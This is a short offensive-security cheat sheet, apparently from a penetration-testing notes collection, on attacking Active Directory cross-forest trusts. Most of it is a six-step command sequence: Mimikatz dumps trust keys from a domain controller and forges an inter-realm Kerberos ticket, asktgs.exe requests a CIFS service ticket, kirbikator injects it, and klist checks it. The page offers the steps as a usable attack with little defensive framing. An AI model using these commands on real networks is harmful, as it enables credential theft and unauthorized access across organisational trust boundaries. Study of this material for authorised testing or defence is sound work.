---
description: Cross Forest Attacks
---

# Cross Forest Attacks

> Attack across forest trusts (external trusts).

In the cases where we have bidirectional trust, that trust flow looks exactly like a domain trust.

The only validation the target forest KDC does (when requesting a TGS after obtaining an inter-realm TGT) is if it can decrpyt it (with trust key). This means that if we have access to the trust key, we can forge an inter-realm TGT for the external trust.

**Note:** In the "cross domain attack", we could escalate to Enterprise Admins by abusing sid history. In this attack (cross forest), we will get whatever privileges our Domain Administrator of the current domain have in the target forest.

### Trust Key Method

#### 1. Grab the trust key

```bash
Invoke-Mimikatz -Command '"lsadump::trust /path"' -ComputerName $DC_HOSTNAME 
Invoke-Mimikatz -Command '"lsadump::lsa /path"' -ComputerName $DC_HOSTNAME
```

**Note:** Grab the key for the trust we are looking for. Ex: \[In] Domain -> ForestDomain.

#### 2. Forge an inter-realm TGT

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:$CURRENT_DOMAIN /sid:$SID_CURRENTDOMAIN /rc4:$TRUSTKEY /service:krbtgt /target:moneycorp.local /ticket:$PATH_TO_SAVE_TICKET.kirbi"' 
```

#### 3. Request a TGS presenting the inter-realm TGT

```bash
.\asktgs.exe C:\PATH\TO\TGT.kirbi CIFS/eurocorp-dc.moneycorp.local
```

#### 4. Inject the TGS

```bash
.\kirbikator.exe lsa .\$TICKET_PREVIOUS_STEP.kirbi
```

#### 5. Verify if it is available

```bash
klist
```

#### 6. Access the service

**Note:** Only services provided are accessible. CIFS might not allow to list c$, but yes a subdirectory.
